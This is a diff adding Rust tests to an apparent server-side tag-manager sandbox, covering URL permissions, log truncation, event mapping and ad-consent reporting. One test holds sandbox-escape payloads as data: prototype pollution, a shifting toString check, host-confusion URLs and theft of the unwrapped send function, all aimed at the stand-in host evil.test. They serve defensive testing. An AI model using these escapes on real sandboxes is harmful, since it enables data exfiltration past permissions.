@@ -1093,6 +1093,80 @@ fn permitted_urls_are_sent_and_others_are_refused() {
 }
 
 #[test]
+fn a_template_cannot_get_past_its_permissions() {
+    let done = ".then(data.gtmOnSuccess, data.gtmOnFailure);";
+    let attempts = [
+        // Changing a built-in the check might lean on.
+        format!("[].__proto__.some = () => true;\nrequire('sendHttpRequest')('https://evil.test/x'){done}"),
+        // A grant that sits on a prototype, not in the template's own.
+        format!("({{}}).__proto__.urls = ['*'];\nrequire('sendHttpRequest')('https://evil.test/x'){done}"),
+        // An address that reads differently the second time it is asked.
+        format!("let n = 0;\nconst u = {{ toString: () => (n++ ? 'https://evil.test/x' : 'https://example.com/ok') }};\nrequire('sendHttpRequest')(u){done}"),
+        // A `*` in the host stays in the host.
+        format!("require('sendHttpRequest')('https://evil.test/a.example.org/x'){done}"),
+        format!("require('sendHttpRequest')('https://evil.test?.example.org/x'){done}"),
+        format!("require('sendHttpRequest')('https://evil.test\\\\.example.org/x'){done}"),
+        format!("require('sendHttpRequest')('https://a.example.org@evil.test/x'){done}"),
+        // Taking the unchecked function out of the wrapper.
+        "let raw;\n(function () {}).__proto__.apply = function () { raw = this; };\n\
+         const send = require('sendHttpRequest');\ntry { send('https://example.com/ok'); } catch (e) {}\n\
+         if (raw) raw('https://evil.test/x');\ndata.gtmOnSuccess();"
+            .to_string(),
+    ];
+    for src in &attempts {
+        let c = permitted_tag(
+            src,
+            json!({"send_http": {"urls": ["https://example.com/*", "https://*.example.org/*"]}}),
+        );
+        let (engine, rec) = engine_with(c, 200);
+        let r = engine.run(ga4_hit(HIT, ""));
+        let sent = rec.sent.lock().unwrap();
+        assert!(
+            sent.iter().all(|o| !o.url.contains("evil.test")),
+            "{src}: sent {:?}, {:?}",
+            sent.iter().map(|o| &o.url).collect::<Vec<_>>(),
+            r.tags
+        );
+    }
+    // With no send permission at all, one on a prototype doesn't count.
+    let c = permitted_tag(
+        "({}).__proto__.send_http = { urls: ['*'] };\nconst r = require;\nr('sendHttpRequest')('https://evil.test/x');\ndata.gtmOnSuccess();",
+        json!({}),
+    );
+    let (engine, rec) = engine_with(c, 200);
+    assert_eq!(engine.run(ga4_hit(HIT, "")).tags[0].outcome, "failure");
+    assert!(rec.sent.lock().unwrap().is_empty());
+    // What the patterns do allow still goes out.
+    for url in ["https://example.com/ok?x=1", "https://a.b.example.org/x"] {
+        let mut c = permitted_tag(
+            "require('sendHttpRequest')(data.url).then(data.gtmOnSuccess, data.gtmOnFailure);",
+            json!({"send_http": {"urls": ["https://example.com/*", "https://*.example.org/*"]}}),
+        );
+        c.tags[0].data = json!({ "url": url });
+        let (engine, rec) = engine_with(c, 200);
+        let r = engine.run(ga4_hit(HIT, ""));
+        assert_eq!(r.tags[0].outcome, "success", "{url}: {:?}", r.tags);
+        assert_eq!(rec.sent.lock().unwrap()[0].url, url);
+    }
+}
+
+#[test]
+fn a_long_log_line_in_any_script_is_cut_not_fatal() {
+    let c = permitted_tag(
+        "require('logToConsole')(data.text);\ndata.gtmOnSuccess();",
+        json!({"logging": {}}),
+    );
+    let mut c = c;
+    // Two bytes a character after an odd start, so byte 1024 falls inside one.
+    c.tags[0].data = json!({ "text": format!("a{}", "é".repeat(2000)) });
+    let (engine, _) = engine_with(c, 200);
+    let r = engine.run(ga4_hit(HIT, ""));
+    assert_eq!(r.tags[0].outcome, "success", "{:?}", r.tags);
+    let line = r.logs.iter().find(|l| l.starts_with("[t]")).unwrap();
+    assert!(line.len() == 1023 && line.ends_with('é'), "{}", line.len());
+}
+
+#[test]
 fn event_data_is_limited_to_the_permitted_keys() {
     let src = "const get = require('getEventData');\n\
         data.seen = [get('event_name'), get('x-ga-mp2-ep.secret')];\n\
@@ -1758,6 +1832,11 @@ fn ad_tags_skip_with_a_reason_and_send_nothing() {
             "v=2&tid=G-1&cid=1.2&en=scroll&gcd=13r3r3r2r5l1".to_string(),
             "unmapped_event",
         ),
+        // A name every object carries is still not a platform event.
+        (
+            "v=2&tid=G-1&cid=1.2&en=constructor&gcd=13r3r3r2r5l1".to_string(),
+            "unmapped_event",
+        ),
         // Today's banner: analytics only, so gcs=G101.
         (format!("{BASE}&gcs=G101"), "consent:ad_storage=denied"),
         // Ad storage granted, ad user data denied after the banner ("q").
@@ -2314,9 +2393,21 @@ fn google_ads_sends_a_conversion_with_the_click_and_a_cached_token() {
     assert_eq!(ev["transactionId"], "T1");
     assert_eq!(ev["eventTimestamp"], "2026-10-25T08:00:05+00:00");
     assert_eq!(ev["eventSource"], "WEB");
+    assert_eq!(
+        body["consent"],
+        json!({ "adUserData": "CONSENT_GRANTED", "adPersonalization": "CONSENT_GRANTED" })
+    );
 
-    // The token is reused by the next conversion.
+    // The token is reused by the next conversion, and a visitor who denied
+    // ad personalisation (the fourth letter of gcd) is reported so.
+    let mut req = req;
+    req.query = req.query.replace("gcd=13r3r3r2r5l1", "gcd=13r3r3r2q5l1");
     engine.run(req);
+    let ingest = bodies(&rec, "https://datamanager.googleapis.com/v1/events:ingest");
+    assert_eq!(
+        ingest[1].1["consent"]["adPersonalization"],
+        "CONSENT_DENIED"
+    );
     let tokens = rec
         .sent
         .lock()
